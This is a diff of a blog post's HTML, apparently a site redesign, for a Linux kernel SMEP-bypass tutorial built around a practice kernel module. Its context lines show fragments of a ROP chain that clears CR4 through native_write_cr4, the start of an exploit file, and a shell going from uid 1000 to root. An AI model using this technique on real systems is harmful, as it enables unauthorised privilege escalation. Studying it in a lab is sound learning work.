@@ -1,72 +1,64 @@
 <!doctype html><html lang=en>
 <head>
+<title>Linux Kernel :: SMEP Bypass :: Anvbis</title>
 <meta charset=utf-8>
-<meta http-equiv=x-ua-compatible content="ie=edge">
-<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
-<meta name=author content>
+<meta name=viewport content="width=device-width,initial-scale=1">
 <meta name=description content="Linux kernel SMEP bypass technique.">
 <meta name=keywords content>
 <meta name=robots content="noodp">
-<meta name=theme-color content>
-<link rel=canonical href=https://anvbis.github.io/posts/linux-kernel-smep-bypass/>
-<title>
-Linux Kernel :: SMEP Bypass :: Anubis
-</title>
-<link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css>
-<link rel=stylesheet href=/main.04ccab17a090ab7631f283645aff8adfdbd0eb8d6fc2738d01581aa99a6ce4ef.css>
-<meta itemprop=name content="Linux Kernel :: SMEP Bypass">
-<meta itemprop=description content="Linux kernel SMEP bypass technique."><meta itemprop=datePublished content="2021-12-10T00:00:00+00:00">
-<meta itemprop=dateModified content="2021-12-10T00:00:00+00:00">
-<meta itemprop=wordCount content="514"><meta itemprop=image content="https://anvbis.github.io">
-<meta itemprop=keywords content>
-<meta name=twitter:card content="summary_large_image">
-<meta name=twitter:image content="https://anvbis.github.io">
-<meta name=twitter:title content="Linux Kernel :: SMEP Bypass">
-<meta name=twitter:description content="Linux kernel SMEP bypass technique.">
+<link rel=canonical href=https://www.anvbis.net/posts/linux-kernel-smep-bypass/>
+<link rel=stylesheet href=https://www.anvbis.net/assets/style.css>
+<link rel=stylesheet href=https://www.anvbis.net/assets/green.css>
+<link rel=apple-touch-icon href=https://www.anvbis.net/img/apple-touch-icon-192x192.png>
+<link rel="shortcut icon" href=https://www.anvbis.net/img/favicon/green.png>
+<meta name=twitter:card content="summary">
+<meta property="og:locale" content="en">
+<meta property="og:type" content="article">
 <meta property="og:title" content="Linux Kernel :: SMEP Bypass">
 <meta property="og:description" content="Linux kernel SMEP bypass technique.">
-<meta property="og:type" content="article">
-<meta property="og:url" content="https://anvbis.github.io/posts/linux-kernel-smep-bypass/"><meta property="og:image" content="https://anvbis.github.io"><meta property="article:section" content="posts">
-<meta property="article:published_time" content="2021-12-10T00:00:00+00:00">
-<meta property="article:modified_time" content="2021-12-10T00:00:00+00:00"><meta property="og:site_name" content="Anubis">
+<meta property="og:url" content="https://www.anvbis.net/posts/linux-kernel-smep-bypass/">
+<meta property="og:site_name" content="Anvbis">
+<meta property="og:image" content="https://www.anvbis.net/img/favicon/green.png">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
 <meta property="article:section" content="Kernel">
 <meta property="article:section" content="SMEP">
 <meta property="article:section" content="Linux">
 <meta property="article:published_time" content="2021-12-10 00:00:00 +0000 UTC">
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-1JEBQ6E1CF"></script>
-<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-1JEBQ6E1CF')</script>
 </head>
-<body>
-<div class=container>
+<body class=green>
+<div class="container center headings--one-size">
 <header class=header>
-<span class=header__inner>
-<a href=/ style=text-decoration:none>
+<div class=header__inner>
+<div class=header__logo>
+<a href=/>
 <div class=logo>
-<span class=logo__mark>></span>
-<span class=logo__text>anvbis</span>
-<span class=logo__cursor>
-</span>
+anvbis
 </div>
 </a>
-<span class=header__right>
+</div>
+<div class=menu-trigger>menu</div>
+</div>
 <nav class=menu>
-<ul class=menu__inner><li><a href=/posts>Blog</a></li>
+<ul class="menu__inner menu__inner--desktop">
+<li><a href=/posts>Blog</a></li>
+</ul>
+<ul class="menu__inner menu__inner--mobile">
+<li><a href=/posts>Blog</a></li>
 </ul>
 </nav>
-<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
-</span>
-</span>
-</span>
 </header>
 <div class=content>
-<main class=post>
-<div class=post-info>
-</p>
+<div class=post>
+<h1 class=post-title>
+<a href=https://www.anvbis.net/posts/linux-kernel-smep-bypass/>Linux Kernel :: SMEP Bypass</a></h1>
+<div class=post-meta>
+<span class=post-date>
+2021-12-10
+</span>
 </div>
-<article>
-<h2 class=post-title><a href=https://anvbis.github.io/posts/linux-kernel-smep-bypass/>Linux Kernel :: SMEP Bypass</a></h2>
-<div class=post-content>
-<h2 id=environment-setup>Environment Setup</h2>
+<div class=post-content><div>
+<h2 id=environment-setup>Environment Setup<a href=#environment-setup class=hanchor arialabel=Anchor>&#8983;</a> </h2>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=color:#75715e>#!/bin/bash
 </span><span style=color:#75715e></span>
 <span style=color:#75715e># build root fs</span>
@@ -86,7 +78,7 @@ popd
 </span><span style=color:#ae81ff></span>    -cpu kvm64,+smep <span style=color:#ae81ff>\
 </span><span style=color:#ae81ff></span>    -append <span style=color:#e6db74>&#34;console=ttyS0 nokaslr quiet&#34;</span>
 </code></pre></div><pre><code>~/pwnkernel $ ./launch.sh
-</code></pre><h2 id=practice-kernel-module>Practice Kernel Module</h2>
+</code></pre><h2 id=practice-kernel-module>Practice Kernel Module<a href=#practice-kernel-module class=hanchor arialabel=Anchor>&#8983;</a> </h2>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;linux/kernel.h&gt;</span><span style=color:#75715e>
 </span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;linux/module.h&gt;</span><span style=color:#75715e>
 </span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;linux/fs.h&gt;</span><span style=color:#75715e>
@@ -158,7 +150,7 @@ clean:
 / # id
 uid=0(root) gid=0
 / # insmod ./challenge.ko
-</code></pre><h2 id=bypassing-smep-protection>Bypassing SMEP Protection</h2>
+</code></pre><h2 id=bypassing-smep-protection>Bypassing SMEP Protection<a href=#bypassing-smep-protection class=hanchor arialabel=Anchor>&#8983;</a> </h2>
 <pre><code>/ # cat /proc/kallsyms | grep native_write_cr4
 ffffffff8102dab0 T native_write_cr4
 </code></pre><pre><code>pwndbg&gt; p $cr4
@@ -168,7 +160,7 @@ $2 = 0x1006f0
 </code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>rop_chain[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xffffffff81001518</span>; <span style=color:#75715e>// pop rdi; ret
 </span><span style=color:#75715e></span>rop_chain[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x6f0</span>;              <span style=color:#75715e>// rdi = 0x6f0
 </span><span style=color:#75715e></span>rop_chain[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xffffffff8102dab0</span>; <span style=color:#75715e>// native_write_cr4
-</span></code></pre></div><h2 id=exploit-development>Exploit Development</h2>
+</span></code></pre></div><h2 id=exploit-development>Exploit Development<a href=#exploit-development class=hanchor arialabel=Anchor>&#8983;</a> </h2>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>nclude <span style=color:#f92672>&lt;</span>stdio.h<span style=color:#f92672>&gt;</span>
 <span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
 </span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;assert.h&gt;</span><span style=color:#75715e>
@@ -280,21 +272,19 @@ uid=1000(ctf) gid=1000 groups=1000
 /home/ctf/linux-kernel-exp/smep-bypass # id
 uid=0(root) gid=0
 </code></pre>
+</div></div>
 </div>
-</article>
-<hr>
-<div class=post-info>
-<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>
-<span class=tag><a href=https://anvbis.github.io/categories/kernel/>Kernel</a></span>
-<span class=tag><a href=https://anvbis.github.io/categories/smep/>SMEP</a></span>
-<span class=tag><a href=https://anvbis.github.io/categories/linux/>Linux</a></span>
-</p>
-</div>
-</main>
 </div>
 <footer class=footer>
-</footer>
+<div class=footer__inner>
+<div class="copyright copyright--user">
+<span>Copyright 2020 Anvbis</span>
+<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span>
 </div>
-<script type=text/javascript src=/bundle.min.72f3cdb1757e654c5aa1329a4269ea6a8d7b37513de3b9d54d7a5ca25573fb3a64f872d6c36cdb2acf759068fd27157cda3ac3827a42378d38946a025e58b6e6.js integrity="sha512-cvPNsXV+ZUxaoTKaQmnqao17N1E947nVTXpcolVz+zpk+HLWw2zbKs91kGj9JxV82jrDgnpCN404lGoCXli25g=="></script>
+</div>
+</footer>
+<script src=https://www.anvbis.net/assets/main.js></script>
+<script src=https://www.anvbis.net/assets/prism.js></script>
+</div>
 </body>
 </html>
